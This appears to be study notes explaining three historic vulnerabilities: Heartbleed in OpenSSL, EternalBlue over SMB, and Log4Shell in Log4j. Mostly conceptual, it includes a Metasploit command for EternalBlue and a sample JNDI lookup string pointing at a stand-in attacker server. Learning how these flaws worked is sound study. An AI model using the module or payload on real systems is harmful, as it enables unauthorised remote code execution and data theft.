### How Heartbleed worked:
Heartbleed was a serious security vulnerability that affected the OpenSSL cryptographic software library, which is widely used to secure communication on the internet. This vulnerability was discovered in April 2014 and became a major concern because it could potentially expose sensitive data, including usernames, passwords, and even encryption keys, from servers that were vulnerable to the attack.

Here's an explanation of how the Heartbleed attack worked:

1. Heartbeat Extension: OpenSSL includes a feature known as the "Heartbeat Extension," which is used to keep SSL/TLS connections alive by periodically sending a "heartbeat" message from one party to the other. The purpose of this heartbeat is to ensure that the connection remains active and responsive.

2. Memory Leak: The Heartbleed vulnerability was caused by a programming error in the OpenSSL implementation of the Heartbeat Extension. Specifically, a flaw in the code allowed an attacker to send a maliciously crafted heartbeat request to a vulnerable server.

3. Data Retrieval: When a malicious heartbeat request was sent, it could trick the vulnerable server into responding with more data than it should. The attacker could specify a payload size in the request, and the server would respond with that amount of data from its memory, including data that should have been kept secret.

4. Sensitive Data Exposure: The data retrieved from the server's memory could include sensitive information such as usernames, passwords, session tokens, and even the private encryption keys used by the server. This information could potentially be used to impersonate users, decrypt encrypted communication, or launch further attacks on the server.
 
5. Exploitation: To exploit Heartbleed, an attacker needed to send specially crafted heartbeat requests to a vulnerable server. If the server was running a vulnerable version of OpenSSL, it would respond with the requested data, which the attacker could then use maliciously.

6. Patching and Remediation: Once Heartbleed was discovered, the OpenSSL project released a patched version to fix the vulnerability. System administrators and website operators were urged to update their OpenSSL installations to the patched version, revoke and reissue SSL/TLS certificates, and reset passwords as a precaution.

7. Widespread Impact: Heartbleed had a significant impact on internet security because OpenSSL is used by a large number of web servers, email servers, and other networked devices. Many organizations had to take immediate action to secure their systems and mitigate the potential consequences of the vulnerability.

Heartbleed served as a wake-up call for the importance of properly auditing and securing open-source software that is critical to the functioning of the internet. It also highlighted the need for organizations to have strong security practices in place, including regularly updating and patching software to protect against emerging threats.


# 2. Eternal Blue

* The vulnerable machine on the network should have port 445 open, as eternal_blue exploit can only run on the port 445.
* `use windows/smb/ms_17_010_eternal_blue`

# 3. log4j 
The Log4j vulnerability, also known as "Log4Shell" and identified as CVE-2021-44228, was a critical security flaw that affected the Apache Log4j library, a widely used logging framework in Java applications. This vulnerability allowed attackers to execute arbitrary code on systems running affected versions of Log4j. Here's how the Log4j vulnerability worked:

1. **Introduction to Log4j:**
   Log4j is a popular Java-based logging framework used to record log events in applications. It allows developers to configure and customize how log messages are handled, including where and how they are logged.

2. **JNDI Injection:**
   The vulnerability in Log4j was related to its support for Java Naming and Directory Interface (JNDI) lookups within log messages. JNDI is a Java API used for performing lookups on various naming and directory services, including LDAP.

3. **Vulnerable Logging Statements:**
   Log4j allowed for dynamic log messages that could include data from variables or external sources. For example, developers could include user-provided data in log messages. When Log4j processed log messages with specific syntax (e.g., `${jndi:ldap://attacker-server}`), it attempted to perform an LDAP lookup using the specified URL.

4. **Exploitation:**
   If an attacker could craft a log message with a malicious LDAP URL and force it to be processed by an application using a vulnerable version of Log4j, the LDAP lookup would be triggered. This was a vector for remote code execution because the attacker-controlled LDAP server could return a response that included a Java Naming and Directory Interface Reference (JNDI Reference) that could execute arbitrary code when deserialized by the application.

5. **Propagation:**
   This vulnerability was particularly dangerous because it could propagate through applications and services. For example, if a vulnerable Java application received malicious input via a web request, it could trigger the Log4j vulnerability. Attackers could use this to infiltrate and control systems across an organization.

6. **Patches and Mitigations:**
   Upon discovering the vulnerability, the Apache Logging Services Project released a fix to address the issue in Log4j. It's crucial for organizations and developers to promptly apply these patches to protect their systems. In addition to patching, certain configurations and mitigations could be applied to restrict the use of JNDI lookups in log messages and reduce the risk.

The Log4j vulnerability was considered one of the most critical and widespread security issues in recent years due to its potential impact on a wide range of Java-based applications. To protect against such vulnerabilities, it's essential to keep libraries and dependencies up to date, apply security patches, and follow best practices in secure coding and configuration management.
